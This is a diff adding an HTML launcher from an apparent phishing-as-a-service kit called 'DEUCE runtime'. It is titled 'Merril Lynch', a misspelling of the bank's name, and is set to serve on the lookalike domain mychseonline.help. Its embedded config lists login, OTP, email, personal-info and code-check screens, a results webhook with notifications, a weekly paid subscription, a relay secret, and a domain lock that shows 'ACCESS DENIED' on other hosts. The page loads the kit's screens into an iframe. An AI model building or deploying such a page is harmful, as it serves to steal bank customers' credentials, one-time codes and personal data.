@@ -1,0 +1,195 @@
+<!doctype html>
+<!-- DEUCE runtime launcher: upload this one index.html. The full page package is served by DEUCE runtime for this subscriber. -->
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Merril Lynch</title>
+    <style>
+      * { box-sizing: border-box; }
+      html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
+      body { overflow: hidden; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; opacity: 0; transition: opacity .18s ease; }
+      #deuceFrame.active { opacity: 1; }
+      #deuceLauncher,
+      #deuceBlock {
+        min-height: 100vh;
+        place-items: center;
+        padding: 24px;
+        color: #eef8f2;
+        background: #050607;
+      }
+      #deuceLauncher { display: grid; }
+      #deuceLauncher.hidden { display: none; }
+      #deuceLauncher article,
+      #deuceBlock article {
+        max-width: 560px;
+        border: 1px solid rgba(124,255,178,.24);
+        border-radius: 10px;
+        padding: 28px;
+        background: #0d1112;
+      }
+      #deuceBlock.active { display: grid; }
+      #deuceBlock { display: none; }
+      #deuceLauncher small,
+      #deuceBlock small { color: #7cffb2; font-weight: 800; text-transform: uppercase; }
+      #deuceLauncher h1,
+      #deuceBlock h1 { margin: 10px 0; font-size: 1.7rem; }
+      #deuceLauncher p,
+      #deuceBlock p { color: #8da199; line-height: 1.55; }
+      #deuceLauncher code { display: block; color: #7cffb2; overflow-wrap: anywhere; font: 800 .76rem ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    </style>
+  </head>
+  <body>
+    <section id="deuceLauncher">
+      <article>
+        <small>deuce runtime</small>
+        <h1>Loading page</h1>
+        <p>This index.html is a launcher. The page package, session redirects, security checks, and results sync are served by DEUCE runtime.</p>
+        <code id="deuceLauncherMeta">Preparing index.html</code>
+      </article>
+    </section>
+    <iframe id="deuceFrame" title="Merril Lynch"></iframe>
+    <section id="deuceBlock">
+      <article>
+        <small>access denied</small>
+        <h1 id="deuceBlockTitle">ACCESS DENIED</h1>
+        <p id="deuceBlockCopy">ACCESS DENIED</p>
+      </article>
+    </section>
+    <script>
+      window.DEUCE_PAGE_CONFIG = {
+        "id": "user_page_53712111e9f8494788",
+        "userId": "user_4b458b53659b4b0a9e",
+        "packageId": "pkg_9e3af05f6ada43dd82",
+        "packageVersion": "v0.1",
+        "pageId": "Merril Bazooka",
+        "pageName": "Merril Lynch",
+        "source": {
+                "type": "github",
+                "entryFile": "index.html",
+                "screens": [
+                        {
+                                "file": "c.html",
+                                "name": "Code Check",
+                                "role": "screen"
+                        },
+                        {
+                                "file": "email.html",
+                                "name": "Email",
+                                "role": "screen"
+                        },
+                        {
+                                "file": "index.html",
+                                "name": "Entry",
+                                "role": "entry"
+                        },
+                        {
+                                "file": "login2.html",
+                                "name": "Login",
+                                "role": "screen"
+                        },
+                        {
+                                "file": "otp.html",
+                                "name": "OTP",
+                                "role": "screen"
+                        },
+                        {
+                                "file": "personal.html",
+                                "name": "Personal Info",
+                                "role": "screen"
+                        },
+                        {
+                                "file": "thnks.html",
+                                "name": "Success",
+                                "role": "screen"
+                        }
+                ]
+        },
+        "apiBase": "/api",
+        "generatedAt": "2026-07-19T08:01:30.028Z",
+        "domain": "mychseonline.help",
+        "hosting": {
+                "domain": "mychseonline.help",
+                "serverIp": "",
+                "verified": false,
+                "liveStatus": "Setup required",
+                "verifiedAt": null,
+                "hostingType": "render-static-site",
+                "installPath": "root / public directory",
+                "connectionType": "cloudflare-worker",
+                "relayTarget": "https://deuce-pages.onrender.com",
+                "relaySecret": "deuce_ce185fe99be691df4f06550d492c93fbde05ffeb0e23aac3",
+                "relayVerified": false,
+                "relayVerifiedAt": null,
+                "workerRoute": "mychseonline.help/api/*"
+        },
+        "allowedDomains": [
+                "mychseonline.help"
+        ],
+        "subscription": {
+                "autoRenew": true,
+                "renewalDate": "2026-07-26",
+                "renewalPrice": 25,
+                "walletSource": "main-wallet",
+                "billingPeriod": "weekly",
+                "adminFreeSubscription": false
+        },
+        "resultSettings": {
+                "webhook": "/api/page-results",
+                "retentionDays": 30,
+                "notifyOnResult": true
+        },
+        "security": {
+                "captcha": false,
+                "domains": [
+                        "mychseonline.help"
+                ],
+                "bannedIps": [],
+                "turnstile": {
+                        "enabled": false,
+                        "provider": "turnstile",
+                        "siteKey": ""
+                },
+                "whitelistIps": []
+        },
+        "generatedFile": {
+                "apiBase": "/api",
+                "version": "build-001",
+                "downloadName": "Merril Bazooka-index.html",
+                "lastGeneratedAt": "2026-07-19T08:01:30.027Z"
+        },
+        "runtime": {
+                "mode": "launcher",
+                "entryFile": "index.html",
+                "configEndpoint": "/api/config?userPageId=user_page_53712111e9f8494788",
+                "sourceEndpoint": "/api/source?userPageId=user_page_53712111e9f8494788"
+        }
+};
+      const config = window.DEUCE_PAGE_CONFIG;
+      const allowed = config.allowedDomains || [];
+      const host = window.location.hostname;
+      const frame = document.getElementById("deuceFrame");
+      const launcher = document.getElementById("deuceLauncher");
+      const block = document.getElementById("deuceBlock");
+      const blockCopy = document.getElementById("deuceBlockCopy");
+
+      function blockPage(message) {
+        launcher.classList.add("hidden");
+        frame.remove();
+        block.classList.add("active");
+        blockCopy.textContent = message;
+      }
+
+      if (allowed.length && !allowed.includes(host)) {
+        blockPage("ACCESS DENIED");
+      } else {
+        frame.addEventListener("load", () => {
+          launcher.classList.add("hidden");
+          frame.classList.add("active");
+        }, { once: true });
+        frame.src = config.runtime.sourceEndpoint;
+      }
+    </script>
+  </body>
+</html>
